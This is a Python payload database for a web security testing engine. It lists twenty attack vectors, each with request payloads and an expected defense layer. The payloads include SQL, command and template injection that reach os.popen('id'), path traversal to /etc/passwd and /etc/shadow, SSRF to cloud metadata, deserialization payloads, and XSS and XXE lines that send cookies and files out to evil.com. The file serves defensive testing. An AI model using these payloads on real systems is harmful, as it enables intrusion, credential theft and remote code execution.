#!/usr/bin/env python3
"""
attack_payloads.py — 战狼数据攻击引擎 v2.0 payload 数据库
包含20个攻击向量的payload定义及5-10个变体
墨子安全实验室 · 向海容

每个攻击条目:
  id:          唯一标识 D-001 ~ D-020
  name:        攻击名称
  description: 攻击描述
  category:    攻击分类 (sqli/xss/ssrf/pp/ma/ba/toc/toc/module/error/graphql/secondary/crlf/auth/xxe/file/rce/ldap/template/ssti)
  payloads:    5-10个变体列表 (作为变异引擎的种子)
  expected_defense: 预期防御层
  severity:    严重程度 1-10
"""

ATTACK_PAYLOADS = [
    # ========== D-001 ~ D-005: 原5个经典攻击（修复版） ==========
    {
        "id": "D-001",
        "name": "SQL注入 - 经典OR注入",
        "description": "通过OR 1=1绕过身份验证或泄露全部数据",
        "category": "sqli",
        "expected_defense": "DWG Step3 SQL防火墙",
        "severity": 9,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1"}},
            {"method": "POST", "endpoint": "/api/v1/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin\" OR \"1\"=\"1", "password": "admin\" OR \"1\"=\"1"}},
            {"method": "GET", "endpoint": "/api/v1/users?id=1 OR 1=1", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/users?id=1+OR+1%3D1", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/login", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": "username=admin'+OR+'1'%3D'1&password=admin'+OR+'1'%3D'1"},
            {"method": "POST", "endpoint": "/api/v1/query", "headers": {"Content-Type": "application/json"},
             "body": {"sql": "SELECT * FROM users WHERE id = 1 OR 1=1"}},
            {"method": "GET", "endpoint": "/api/v1/search?q=test' UNION SELECT * FROM users--", "headers": {},
             "body": None},
        ]
    },
    {
        "id": "D-002",
        "name": "XSS - 持久化存储型攻击",
        "description": "在评论/表单中注入恶意脚本，测试存储型XSS防御",
        "category": "xss",
        "expected_defense": "DWG Step2/Sanitizer",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/comments", "headers": {"Content-Type": "application/json"},
             "body": {"content": "<script>alert('XSS')</script>"}},
            {"method": "POST", "endpoint": "/api/v1/comments", "headers": {"Content-Type": "application/json"},
             "body": {"content": "<img src=x onerror=alert('XSS')>"}},
            {"method": "POST", "endpoint": "/api/v1/profile", "headers": {"Content-Type": "application/json"},
             "body": {"bio": "<svg onload=alert(document.cookie)>"}},
            {"method": "POST", "endpoint": "/api/v1/comments", "headers": {"Content-Type": "application/json"},
             "body": {"content": "<a href=\"javascript:alert('XSS')\">click</a>"}},
            {"method": "POST", "endpoint": "/api/v1/feedback", "headers": {"Content-Type": "application/json"},
             "body": {"message": "<!--[if gte IE 4]><script>alert('XSS')</script><![endif]-->"}},
            {"method": "PUT", "endpoint": "/api/v1/settings", "headers": {"Content-Type": "application/json"},
             "body": {"display_name": "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>"}},
        ]
    },
    {
        "id": "D-003",
        "name": "命令注入 - OS命令执行",
        "description": "通过输入字段注入系统命令，测试命令执行防护",
        "category": "rce",
        "expected_defense": "DWG Step3 输入过滤",
        "severity": 10,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/ping", "headers": {"Content-Type": "application/json"},
             "body": {"host": "127.0.0.1; cat /etc/passwd"}},
            {"method": "POST", "endpoint": "/api/v1/ping", "headers": {"Content-Type": "application/json"},
             "body": {"host": "127.0.0.1 && dir C:\\"}},
            {"method": "GET", "endpoint": "/api/v1/exec?cmd=whoami", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/convert", "headers": {"Content-Type": "application/json"},
             "body": {"input": "test$(id)", "format": "pdf"}},
            {"method": "POST", "endpoint": "/api/v1/convert", "headers": {"Content-Type": "application/json"},
             "body": {"input": "test`id`", "format": "pdf"}},
            {"method": "GET", "endpoint": "/api/v1/download?file=test.txt|echo%20pwned", "headers": {},
             "body": None}],
    },
    {
        "id": "D-004",
        "name": "路径遍历 - 目录穿越",
        "description": "通过../遍历读取服务器敏感文件",
        "category": "file",
        "expected_defense": "DWG Step2 路径规范化",
        "severity": 7,
        "payloads": [
            {"method": "GET", "endpoint": "/api/v1/download?file=../../../etc/passwd", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/download?file=....//....//....//etc/passwd", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/avatar?user=../../etc/shadow", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/upload", "headers": {"Content-Type": "application/json"},
             "body": {"path": "../../../tmp/evil.txt", "content": "pwned"}},
        ]
    },
    {
        "id": "D-005",
        "name": "CSRF - 跨站请求伪造",
        "description": "测试是否缺少CSRF Token验证",
        "category": "auth",
        "expected_defense": "DWG Step3 CSRF Token",
        "severity": 6,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/transfer", "headers": {"Content-Type": "application/json"},
             "body": {"to": "attacker", "amount": 10000}},
            {"method": "POST", "endpoint": "/api/v1/transfer", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": "to=attacker&amount=10000"},
            {"method": "POST", "endpoint": "/api/v1/change_password", "headers": {"Content-Type": "application/json"},
             "body": {"new_password": "hacked123"}},
            {"method": "POST", "endpoint": "/api/v1/email/update", "headers": {"Content-Type": "application/json"},
             "body": {"email": "attacker@evil.com"}},
            {"method": "POST", "endpoint": "/api/v1/admin/delete_user", "headers": {"Content-Type": "application/json"},
             "body": {"user_id": 1}},
            {"method": "PUT", "endpoint": "/api/v1/settings/api_key", "headers": {"Content-Type": "application/json"},
             "body": {"api_key": "revoked-by-csrf"}},
        ]
    },

    # ========== D-006 ~ D-010: 新增遗漏攻击向量 M-001~M-005 ==========
    {
        "id": "D-006",
        "name": "SSRF注入 - 服务器端请求伪造",
        "description": "M-001: 利用SSRF读取云元数据/内网服务/file协议",
        "category": "ssrf",
        "expected_defense": "DWG Step3 URL白名单/SSRF防护",
        "severity": 9,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/fetch", "headers": {"Content-Type": "application/json"},
             "body": {"url": "http://169.254.169.254/latest/meta-data/"}},
            {"method": "POST", "endpoint": "/api/v1/fetch", "headers": {"Content-Type": "application/json"},
             "body": {"url": "file:///etc/passwd"}},
            {"method": "POST", "endpoint": "/api/v1/proxy", "headers": {"Content-Type": "application/json"},
             "body": {"target": "http://127.0.0.1:8080/admin"}},
            {"method": "POST", "endpoint": "/api/v1/fetch", "headers": {"Content-Type": "application/json"},
             "body": {"url": "http://10.0.0.1:3306"}},  # 内网MySQL
            {"method": "POST", "endpoint": "/api/v1/avatar/proxy", "headers": {"Content-Type": "application/json"},
             "body": {"image_url": "http://[::1]:6379"}},  # IPv6 localhost Redis
            {"method": "POST", "endpoint": "/api/v1/fetch", "headers": {"Content-Type": "application/json"},
             "body": {"url": "http://0.0.0.0:22"}},
            {"method": "POST", "endpoint": "/api/v1/fetch", "headers": {"Content-Type": "application/json"},
             "body": {"url": "dict://127.0.0.1:6379/info"}},  # dict协议Redis
        ]
    },
    {
        "id": "D-007",
        "name": "原型污染 - Prototype Pollution",
        "description": "M-002: 通过__proto__/constructor污染JS原型链",
        "category": "pp",
        "expected_defense": "DWG Step2 JSON Schema验证",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/config", "headers": {"Content-Type": "application/json"},
             "body": {"__proto__": {"admin": True}}},
            {"method": "POST", "endpoint": "/api/v1/config", "headers": {"Content-Type": "application/json"},
             "body": {"constructor": {"prototype": {"isAdmin": True}}}},
            {"method": "POST", "endpoint": "/api/v1/merge", "headers": {"Content-Type": "application/json"},
             "body": {"a": {"b": {"c": {"__proto__": {"polluted": True}}}}}},
            {"method": "POST", "endpoint": "/api/v1/settings", "headers": {"Content-Type": "application/json"},
             "body": {"__proto__": {"bypassAuth": True, "role": "admin"}}},
            {"method": "POST", "endpoint": "/api/v1/merge", "headers": {"Content-Type": "application/json"},
             "body": {"a": {"__proto__": {"__proto__": {"injected": "yes"}}}}},
            {"method": "POST", "endpoint": "/api/v1/config", "headers": {"Content-Type": "application/json"},
             "body": {"__proto__": {"shell": "id", "NODE_OPTIONS": "--inspect"}}},
        ]
    },
    {
        "id": "D-008",
        "name": "批量赋值 - Mass Assignment",
        "description": "M-003: 契约未声明但DB存在的字段注入",
        "category": "ma",
        "expected_defense": "DWG Step1 DTO白名单",
        "severity": 7,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/users/register", "headers": {"Content-Type": "application/json"},
             "body": {"username": "test", "password": "test", "role": "admin", "is_admin": True}},
            {"method": "POST", "endpoint": "/api/v1/users/register", "headers": {"Content-Type": "application/json"},
             "body": {"username": "test", "password": "test", "balance": 999999, "credit": 999999}},
            {"method": "PUT", "endpoint": "/api/v1/users/profile", "headers": {"Content-Type": "application/json"},
             "body": {"email": "test@test.com", "email_verified": True}},
            {"method": "POST", "endpoint": "/api/v1/users/register", "headers": {"Content-Type": "application/json"},
             "body": {"username": "test", "password": "test", "roles": ["admin", "superuser"]}},
            {"method": "PUT", "endpoint": "/api/v1/users/profile", "headers": {"Content-Type": "application/json"},
             "body": {"nickname": "new", "deleted_at": None}},
            {"method": "POST", "endpoint": "/api/v1/orders", "headers": {"Content-Type": "application/json"},
             "body": {"product_id": 1, "quantity": 1, "total_price": 0.01, "approved": True}},
        ]
    },
    {
        "id": "D-009",
        "name": "业务逻辑滥用 - 合法格式恶意语义",
        "description": "M-004: 格式正确但语义恶意的业务逻辑绕过",
        "category": "ba",
        "expected_defense": "DWG Step1 业务规则引擎",
        "severity": 6,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/coupon/redeem", "headers": {"Content-Type": "application/json"},
             "body": {"code": "WELCOME10", "quantity": -1}},
            {"method": "POST", "endpoint": "/api/v1/coupon/redeem", "headers": {"Content-Type": "application/json"},
             "body": {"code": "WELCOME10", "quantity": 999999}},
            {"method": "POST", "endpoint": "/api/v1/order/cancel", "headers": {"Content-Type": "application/json"},
             "body": {"order_id": "00000000-0000-0000-0000-000000000000"}},
            {"method": "POST", "endpoint": "/api/v1/transfer", "headers": {"Content-Type": "application/json"},
             "body": {"from": "attacker", "to": "victim", "amount": -100}},
            {"method": "POST", "endpoint": "/api/v1/register", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin", "password": "   ", "invite_code": "INVITE-ADMIN"}},
            {"method": "PUT", "endpoint": "/api/v1/inventory", "headers": {"Content-Type": "application/json"},
             "body": {"product_id": 1, "delta": 2147483647}},
            {"method": "POST", "endpoint": "/api/v1/loan/apply", "headers": {"Content-Type": "application/json"},
             "body": {"amount": 0, "term": 12}},
        ]
    },
    {
        "id": "D-010",
        "name": "TOCTOU竞争条件 - 时序攻击",
        "description": "M-005: 验证后写入前的篡改窗口利用",
        "category": "toc",
        "expected_defense": "DWG Step1 事务锁/原子操作",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/withdraw", "headers": {"Content-Type": "application/json"},
             "body": {"amount": 10000}, "race": True, "concurrent_requests": 50},
            {"method": "POST", "endpoint": "/api/v1/coupon/redeem", "headers": {"Content-Type": "application/json"},
             "body": {"code": "ONETIME50"}, "race": True, "concurrent_requests": 100},
            {"method": "POST", "endpoint": "/api/v1/vote", "headers": {"Content-Type": "application/json"},
             "body": {"candidate_id": 1}, "race": True, "concurrent_requests": 200},
            {"method": "POST", "endpoint": "/api/v1/inventory/reserve", "headers": {"Content-Type": "application/json"},
             "body": {"product_id": 1, "quantity": 1}, "race": True, "concurrent_requests": 50},
            {"method": "POST", "endpoint": "/api/v1/signup/bonus", "headers": {"Content-Type": "application/json"},
             "body": {"user_id": 1}, "race": True, "concurrent_requests": 100},
        ]
    },

    # ========== D-011 ~ D-015: 新增遗漏攻击向量 M-006~M-010 ==========
    {
        "id": "D-011",
        "name": "模块内部沦陷 - Module GRANT ALL滥用",
        "description": "M-006: 内部模块间过度授权导致的横向移动",
        "category": "module",
        "expected_defense": "DWG Step1 最小权限原则",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/module/user/call", "headers": {"Content-Type": "application/json"},
             "body": {"target_module": "payment", "action": "execute_refund", "params": {"amount": 999999}}},
            {"method": "POST", "endpoint": "/api/v1/module/token/exchange", "headers": {"Content-Type": "application/json"},
             "body": {"source_token": "user_service_token", "target_scope": "admin:*"}},
            {"method": "POST", "endpoint": "/api/v1/internal/rpc", "headers": {"Content-Type": "application/json"},
             "body": {"service": "db_admin", "method": "TRUNCATE users"}},
            {"method": "POST", "endpoint": "/api/v1/module/notification/send", "headers": {"Content-Type": "application/json"},
             "body": {"target_service": "email", "template": "welcome", "data": {"__globals__": {"db_pass": "secrets"}}}},
            {"method": "GET", "endpoint": "/api/v1/internal/health?module=audit&include_secrets=true", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/gateway/route", "headers": {"Content-Type": "application/json"},
             "body": {"path": "/internal/admin/*", "upstream": "http://localhost:9200"}},
        ]
    },
    {
        "id": "D-012",
        "name": "错误信息泄露 - Stack Trace暴露",
        "description": "M-007: 触发异常获取内部架构信息",
        "category": "error",
        "expected_defense": "DWG Step3 统一错误处理",
        "severity": 5,
        "payloads": [
            {"method": "GET", "endpoint": "/api/v1/nonexistent_route_xyz", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": None, "password": None}},
            {"method": "GET", "endpoint": "/api/v1/users?id=NaN", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/users", "headers": {"Content-Type": "application/json"},
             "body": "invalid json{broken"},
            {"method": "GET", "endpoint": "/api/v1/download?file=../../../proc/self/environ", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/debug/stacktrace?error=1", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/query", "headers": {"Content-Type": "application/json"},
             "body": {"sql": "SELECT * FROM non_existent_table"}},
        ]
    },
    {
        "id": "D-013",
        "name": "GraphQL注入 - 深度查询/突变滥用",
        "description": "M-008: GraphQL introspection + 深度嵌套查询攻击",
        "category": "graphql",
        "expected_defense": "DWG Step3 查询深度限制/Introspection禁用",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "query { __schema { types { name fields { name } } } }"}},
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "mutation { deleteUser(id: 1) { id } }"}},
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "query { user(id: 1) { id name email passwordHash role } }"}},
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "query { user(id: 1) { posts { comments { user { posts { comments { content } } } } } } }"}},
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "mutation { updateUser(id: 1, input: {role: \"admin\"}) { id role } }"}},
            {"method": "POST", "endpoint": "/api/v1/graphql", "headers": {"Content-Type": "application/json"},
             "body": {"query": "query{user(id:1){id}}", "variables": "null"}},
        ]
    },
    {
        "id": "D-014",
        "name": "二次注入 - Stored Payload二次触发",
        "description": "M-009: 一次存储无害数据，二次调用时触发注入",
        "category": "secondary",
        "expected_defense": "DWG Step2 存储/读取双端净化",
        "severity": 8,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/profile", "headers": {"Content-Type": "application/json"},
             "body": {"nickname": "' OR 1=1; --"}},
            {"method": "POST", "endpoint": "/api/v1/comments", "headers": {"Content-Type": "application/json"},
             "body": {"content": "<script src='/api/v1/steal'></script>", "secondary_trigger": "/api/v1/admin/render-comments"}},
            {"method": "POST", "endpoint": "/api/v1/profile", "headers": {"Content-Type": "application/json"},
             "body": {"bio": "${7*7}"}},  # SSTI via secondary eval
            {"method": "POST", "endpoint": "/api/v1/feedback", "headers": {"Content-Type": "application/json"},
             "body": {"message": "{{config}}", "secondary_trigger": "/api/v1/reports/generate"}},
            {"method": "POST", "endpoint": "/api/v1/settings", "headers": {"Content-Type": "application/json"},
             "body": {"theme": "'; DROP TABLE audits; --"}},
        ]
    },
    {
        "id": "D-015",
        "name": "CRLF/日志注入 - HTTP响应拆分",
        "description": "M-010: 通过CRLF注入伪造日志条目或HTTP响应拆分",
        "category": "crlf",
        "expected_defense": "DWG Step2 输入净化/换行过滤",
        "severity": 6,
        "payloads": [
            {"method": "GET", "endpoint": "/api/v1/search?q=test%0d%0aX-Injected:%20true", "headers": {},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/search?q=test%0aX-Injected:%20true", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/log", "headers": {"Content-Type": "application/json"},
             "body": {"level": "INFO", "message": "User login: admin\r\n[FAKE] Admin login success from 192.168.1.1"}},
            {"method": "GET", "endpoint": "/api/v1/redirect?url=http://evil.com%0d%0aSet-Cookie:%20steal=token", "headers": {},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/feedback", "headers": {"Content-Type": "application/json"},
             "body": {"message": "正常反馈\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"}},
        ]
    },

    # ========== D-016 ~ D-020: 额外高危害攻击向量 ==========
    {
        "id": "D-016",
        "name": "JWT攻击 - 算法混淆/空签名",
        "description": "绕过JWT签名验证，算法混淆攻击",
        "category": "auth",
        "expected_defense": "DWG Step3 JWT严格验证",
        "severity": 9,
        "payloads": [
            {"method": "GET", "endpoint": "/api/v1/admin/users", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/admin/users", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."},
             "body": None},
            {"method": "GET", "endpoint": "/api/v1/admin/users", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.abc123"},
             "body": None},
            {"method": "POST", "endpoint": "/api/v1/auth/refresh", "headers": {"Content-Type": "application/json"},
             "body": {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.XYZ"}},
            {"method": "GET", "endpoint": "/api/v1/admin/users", "headers": {"Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."},
             "body": None},
        ]
    },
    {
        "id": "D-017",
        "name": "XXE - XML外部实体注入",
        "description": "通过XML解析器读取本地文件或SSRF",
        "category": "xxe",
        "expected_defense": "DWG Step3 禁用DTD/外部实体",
        "severity": 9,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/parse/xml", "headers": {"Content-Type": "application/xml"},
             "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"},
            {"method": "POST", "endpoint": "/api/v1/parse/xml", "headers": {"Content-Type": "application/xml"},
             "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"},
            {"method": "POST", "endpoint": "/api/v1/upload/xml", "headers": {"Content-Type": "application/xml"},
             "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><root>&xxe;</root>"},
            {"method": "POST", "endpoint": "/api/v1/parse/xml", "headers": {"Content-Type": "application/xml"},
             "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe \"<!ENTITY exfil SYSTEM 'http://evil.com/?data=%file;'>\"> %xxe;]><root>&exfil;</root>"},
            {"method": "POST", "endpoint": "/api/v1/soap", "headers": {"Content-Type": "text/xml"},
             "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><soap:Body><foo>&xxe;</foo></soap:Body>"},
        ]
    },
    {
        "id": "D-018",
        "name": "RCE - 反序列化攻击",
        "description": "通过不安全的反序列化执行远程代码",
        "category": "rce",
        "expected_defense": "DWG Step3 反序列化白名单",
        "severity": 10,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/deserialize", "headers": {"Content-Type": "application/octet-stream"},
             "body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL2T14pRiyxdAANmbG9vegAAAD8AAAAAAEAADXC3AgAAeA=="},  # Java反序列化示例
            {"method": "POST", "endpoint": "/api/v1/session", "headers": {"Content-Type": "application/json"},
             "body": {"session_data": "gASVcQAAAAAAAACMFGJ1aWx0aW5zLmV4ZWN1dGXEk5R9lCiMB2dsb2JhbHOUjARleGVjlGgAjAVpbnB1dJSTlIwDaWTllFJGlIWUUpQu"}},  # Python pickle
            {"method": "POST", "endpoint": "/api/v1/cache/restore", "headers": {"Content-Type": "application/json"},
             "body": {"cached_object": "__import__('os').system('id')"}},
            {"method": "POST", "endpoint": "/api/v1/import/yaml", "headers": {"Content-Type": "application/x-yaml"},
             "body": "!!python/object/apply:os.system ['id']"},
            {"method": "POST", "endpoint": "/api/v1/rpc", "headers": {"Content-Type": "application/json"},
             "body": {"jsonrpc": "2.0", "method": "__proto__.exec", "params": ["cat /etc/passwd"], "id": 1}},
        ]
    },
    {
        "id": "D-019",
        "name": "LDAP注入 - 目录服务攻击",
        "description": "LDAP查询注入绕过认证或泄露信息",
        "category": "ldap",
        "expected_defense": "DWG Step3 LDAP过滤/转义",
        "severity": 7,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/ldap/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "*", "password": "*"}},
            {"method": "POST", "endpoint": "/api/v1/ldap/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin)(|(uid=*", "password": "test"}},
            {"method": "POST", "endpoint": "/api/v1/ldap/search", "headers": {"Content-Type": "application/json"},
             "body": {"filter": "(|(uid=admin)(uid=*))"}},
            {"method": "POST", "endpoint": "/api/v1/ldap/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin*", "password": "admin*"}},
            {"method": "POST", "endpoint": "/api/v1/ldap/login", "headers": {"Content-Type": "application/json"},
             "body": {"username": "admin)(cn=*))(|(cn=*", "password": "test"}},
        ]
    },
    {
        "id": "D-020",
        "name": "模板注入 - SSTI服务端模板注入",
        "description": "通过模板引擎执行任意代码",
        "category": "ssti",
        "expected_defense": "DWG Step3 模板沙箱/输入净化",
        "severity": 9,
        "payloads": [
            {"method": "POST", "endpoint": "/api/v1/render", "headers": {"Content-Type": "application/json"},
             "body": {"template": "{{7*7}}"}},
            {"method": "POST", "endpoint": "/api/v1/render", "headers": {"Content-Type": "application/json"},
             "body": {"template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}},
            {"method": "POST", "endpoint": "/api/v1/render", "headers": {"Content-Type": "application/json"},
             "body": {"template": "${7*7}"}},
            {"method": "POST", "endpoint": "/api/v1/email/template", "headers": {"Content-Type": "application/json"},
             "body": {"greeting": "Hello {{user.name}}", "user": {"name": "{{config}}"}}},
            {"method": "POST", "endpoint": "/api/v1/render", "headers": {"Content-Type": "application/json"},
             "body": {"template": "{%for x in().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}"}},
            {"method": "POST", "endpoint": "/api/v1/report/generate", "headers": {"Content-Type": "application/json"},
             "body": {"format": "pdf", "header": "${7*7}", "footer": "{{7*7}}"}},
        ]
    },
]


def get_payloads_by_category(category):
    """按分类获取攻击向量"""
    return [a for a in ATTACK_PAYLOADS if a["category"] == category]


def get_payload_by_id(attack_id):
    """按ID获取攻击向量"""
    for a in ATTACK_PAYLOADS:
        if a["id"] == attack_id:
            return a
    return None


def get_all_ids():
    """返回所有攻击ID列表"""
    return [a["id"] for a in ATTACK_PAYLOADS]


def get_all_categories():
    """返回所有攻击分类"""
    return list(set(a["category"] for a in ATTACK_PAYLOADS))


def get_summary():
    """返回攻击向量的简要统计"""
    by_severity = {}
    by_category = {}
    for a in ATTACK_PAYLOADS:
        sev = a["severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1
        cat = a["category"]
        by_category[cat] = by_category.get(cat, 0) + 1
    return {
        "total": len(ATTACK_PAYLOADS),
        "total_payloads": sum(len(a["payloads"]) for a in ATTACK_PAYLOADS),
        "by_severity": dict(sorted(by_severity.items())),
        "by_category": by_category,
        "severity_avg": sum(a["severity"] for a in ATTACK_PAYLOADS) / len(ATTACK_PAYLOADS),
    }


if __name__ == "__main__":
    import json
    print("[战狼] 攻击Payload数据库加载完成")
    summary = get_summary()
    print(f"[战狼] 总计 {summary['total']} 个攻击向量, {summary['total_payloads']} 个payload变体")
    print(f"[战狼] 平均严重等级: {summary['severity_avg']:.1f}/10")
    print(f"[战狼] 分类分布: {json.dumps(summary['by_category'], ensure_ascii=False)}")
    for a in ATTACK_PAYLOADS:
        print(f"  {a['id']} [{a['category'].upper():>8}] {a['name']} (严重:{a['severity']}, 变体:{len(a['payloads'])})")
